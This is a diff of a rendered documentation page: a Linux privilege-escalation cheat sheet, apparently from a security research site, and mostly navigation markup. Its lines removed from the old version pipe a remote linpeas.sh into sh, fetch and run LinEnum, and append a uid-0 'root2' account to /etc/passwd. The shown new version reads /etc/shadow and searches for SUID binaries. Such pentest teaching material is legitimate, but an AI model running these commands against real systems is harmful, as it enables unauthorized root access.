+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Research
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
   
   
   
@@ -352,6 +734,277 @@
     
   
     Research
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kernel
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Kernel
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../research/kernel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kernel Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../research/kernel/ebpf-intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introducción a eBPF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Malware Dev
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Malware Dev
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../research/malware-dev/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Malware Development
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../research/malware-dev/shellcode-basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shellcode Basics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
   
 
     
@@ -391,22 +1044,22 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#enumeracion-inicial" class="md-nav__link">
+  <a href="#enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Enumeración Inicial
+        // Enumeration
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Enumeración Inicial">
+    <nav class="md-nav" aria-label="// Enumeration">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#sistema" class="md-nav__link">
+  <a href="#system-information" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Sistema
+        System Information
       
     </span>
   </a>
@@ -414,10 +1067,21 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#herramientas-automaticas" class="md-nav__link">
+  <a href="#users-groups" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Herramientas Automáticas
+        Users &amp; Groups
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network
       
     </span>
   </a>
@@ -430,22 +1094,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#vectores-de-escalada" class="md-nav__link">
+  <a href="#suidsgid-binaries" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Vectores de Escalada
+        // SUID/SGID Binaries
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Vectores de Escalada">
+    <nav class="md-nav" aria-label="// SUID/SGID Binaries">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#suidsgid" class="md-nav__link">
+  <a href="#find-suid-binaries" class="md-nav__link">
     <span class="md-ellipsis">
       
-        SUID/SGID
+        Find SUID Binaries
       
     </span>
   </a>
@@ -453,10 +1117,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#sudo" class="md-nav__link">
+  <a href="#find-sgid-binaries" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Sudo
+        Find SGID Binaries
       
     </span>
   </a>
@@ -464,10 +1128,127 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#gtfobins-check" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GTFOBins Check
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#capabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        // Capabilities
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="// Capabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-capabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Find Capabilities
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitable-capabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitable Capabilities
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sudo-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        // Sudo Exploitation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="// Sudo Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#check-sudo-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Check Sudo Permissions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-sudo-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Sudo Exploits
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sudo-version-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Sudo Version Exploits
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#cron-jobs" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Cron Jobs
+        // Cron Jobs
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="// Cron Jobs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumerate-cron" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumerate Cron
       
     </span>
   </a>
@@ -475,10 +1256,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#archivos-con-permisos-debiles" class="md-nav__link">
+  <a href="#exploit-writable-scripts" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Archivos con Permisos Débiles
+        Exploit Writable Scripts
       
     </span>
   </a>
@@ -486,10 +1267,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#kernel-exploits" class="md-nav__link">
+  <a href="#path-injection" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Kernel Exploits
+        PATH Injection
       
     </span>
   </a>
@@ -502,22 +1283,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#tecnicas-comunes" class="md-nav__link">
+  <a href="#writable-files" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Técnicas Comunes
+        // Writable Files
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Técnicas Comunes">
+    <nav class="md-nav" aria-label="// Writable Files">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#path-hijacking" class="md-nav__link">
+  <a href="#find-writable-directories" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Path Hijacking
+        Find Writable Directories
       
     </span>
   </a>
@@ -525,10 +1306,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#library-hijacking" class="md-nav__link">
+  <a href="#find-writable-files" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Library Hijacking
+        Find Writable Files
       
     </span>
   </a>
@@ -536,10 +1317,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#docker-escape" class="md-nav__link">
+  <a href="#world-writable-etcshadow" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Docker Escape
+        World-Writable /etc/shadow
       
     </span>
   </a>
@@ -548,6 +1329,167 @@
         
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        // Kernel Exploits
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="// Kernel Exploits">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#check-kernel-version" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Check Kernel Version
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-kernel-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Kernel Exploits
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dirtypipe-cve-2022-0847" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DirtyPipe (CVE-2022-0847)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docker-escape" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        // Docker Escape
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="// Docker Escape">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#check-if-in-container" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Check if in Container
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privileged-container" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privileged Container
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#docker-socket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Docker Socket
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#automated-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        // Automated Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="// Automated Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#linpeas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LinPEAS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#linenum" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LinEnum
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#linux-exploit-suggester" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        linux-exploit-suggester
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        // Quick Reference
+      
+    </span>
+  </a>
   
 </li>
       
@@ -564,112 +1506,314 @@
               
               <article class="md-content__inner md-typeset">
                 
+  
                   
 
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:enumeration" class="md-tag">enumeration</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:privesc" class="md-tag">privesc</a>
+      
+    
+  </nav>
+
 
   
   
 
 
-<h1 id="linux-privilege-escalation">Linux Privilege Escalation<a class="headerlink" href="#linux-privilege-escalation" title="Permanent link">&para;</a></h1>
-<h2 id="enumeracion-inicial">Enumeración Inicial<a class="headerlink" href="#enumeracion-inicial" title="Permanent link">&para;</a></h2>
-<h3 id="sistema">Sistema<a class="headerlink" href="#sistema" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Info del sistema</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>uname<span class="w"> </span>-a
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>cat<span class="w"> </span>/etc/os-release
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>hostname
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># Usuarios</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>id
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>whoami
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span>nologin
-</code></pre></div>
-<h3 id="herramientas-automaticas">Herramientas Automáticas<a class="headerlink" href="#herramientas-automaticas" title="Permanent link">&para;</a></h3>
-<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">LinPEAS</label><label for="__tabbed_1_2">LinEnum</label></div>
-<div class="tabbed-content">
-<div class="tabbed-block">
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>curl<span class="w"> </span>-L<span class="w"> </span>https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>sh
-</code></pre></div>
-</div>
-<div class="tabbed-block">
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>wget<span class="w"> </span>https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>LinEnum.sh<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./LinEnum.sh
-</code></pre></div>
-</div>
-</div>
-</div>
-<h2 id="vectores-de-escalada">Vectores de Escalada<a class="headerlink" href="#vectores-de-escalada" title="Permanent link">&para;</a></h2>
-<h3 id="suidsgid">SUID/SGID<a class="headerlink" href="#suidsgid" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Buscar binarios SUID</span>
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
-<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Buscar binarios SGID</span>
-<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
-<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c1"># Buscar capabilities</span>
-<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-</code></pre></div>
-<div class="admonition tip">
-<p class="admonition-title">GTFOBins</p>
-<p>Consulta <a href="https://gtfobins.github.io/">GTFOBins</a> para explotar binarios SUID</p>
-</div>
-<h3 id="sudo">Sudo<a class="headerlink" href="#sudo" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Permisos sudo</span>
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>sudo<span class="w"> </span>-l
-<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
-<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># Versión de sudo (CVE-2021-4034, etc)</span>
-<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>sudo<span class="w"> </span>--version
-</code></pre></div>
-<h3 id="cron-jobs">Cron Jobs<a class="headerlink" href="#cron-jobs" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Listar cron jobs</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>cat<span class="w"> </span>/etc/crontab
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
-<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>crontab<span class="w"> </span>-l
-<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
-<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># Monitorear procesos</span>
-<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># Usando pspy</span>
-<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>./pspy64
-</code></pre></div>
-<h3 id="archivos-con-permisos-debiles">Archivos con Permisos Débiles<a class="headerlink" href="#archivos-con-permisos-debiles" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Archivos escribibles</span>
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
-<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
-<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># /etc/passwd escribible</span>
-<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>ls<span class="w"> </span>-la<span class="w"> </span>/etc/passwd
-<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c1"># Si es escribible:</span>
-<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;root2:$(openssl passwd password):0:0:root:/root:/bin/bash&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd
-</code></pre></div>
-<h3 id="kernel-exploits">Kernel Exploits<a class="headerlink" href="#kernel-exploits" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Versión del kernel</span>
-<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>uname<span class="w"> </span>-r
-<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
-<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># Buscar exploits</span>
-<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>searchsploit<span class="w"> </span>linux<span class="w"> </span>kernel<span class="w"> </span><span class="k">$(</span>uname<span class="w"> </span>-r<span class="k">)</span>
-</code></pre></div>
+<h1 id="linux-privilege-escalation">Linux Privilege Escalation<a class="headerlink" href="#linux-privilege-escalation" title="Enlace permanente">&para;</a></h1>
+<p>Guía completa de técnicas de escalada de privilegios en sistemas Linux.</p>
+<hr />
+<h2 id="enumeration">// Enumeration<a class="headerlink" href="#enumeration" title="Enlace permanente">&para;</a></h2>
+<h3 id="system-information">System Information<a class="headerlink" href="#system-information" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Kernel version</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>uname<span class="w"> </span>-a
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>cat<span class="w"> </span>/proc/version
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>cat<span class="w"> </span>/etc/issue
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># Architecture</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>arch
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="c1"># Hostname</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>hostname
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="c1"># Environment variables</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>env
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>cat<span class="w"> </span>/etc/profile
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>cat<span class="w"> </span>~/.bashrc
+</span></code></pre></div>
+<h3 id="users-groups">Users &amp; Groups<a class="headerlink" href="#users-groups" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Current user</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>id
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>whoami
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># All users</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>cat<span class="w"> </span>/etc/passwd
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>cat<span class="w"> </span>/etc/shadow<span class="w">  </span><span class="c1"># if readable</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c1"># Groups</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>cat<span class="w"> </span>/etc/group
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="c1"># Sudo permissions</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="c1"># Users with bash</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;/bin/(ba)?sh&#39;</span><span class="w"> </span>/etc/passwd
+</span></code></pre></div>
+<h3 id="network">Network<a class="headerlink" href="#network" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Network interfaces</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>ip<span class="w"> </span>a
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>ifconfig
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c1"># Routing</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>ip<span class="w"> </span>route
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>route<span class="w"> </span>-n
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="c1"># Open ports</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>ss<span class="w"> </span>-tulpn
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>netstat<span class="w"> </span>-tulpn
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="c1"># Connections</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>ss<span class="w"> </span>-anp
+</span></code></pre></div>
+<hr />
+<h2 id="suidsgid-binaries">// SUID/SGID Binaries<a class="headerlink" href="#suidsgid-binaries" title="Enlace permanente">&para;</a></h2>
+<h3 id="find-suid-binaries">Find SUID Binaries<a class="headerlink" href="#find-suid-binaries" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-u<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
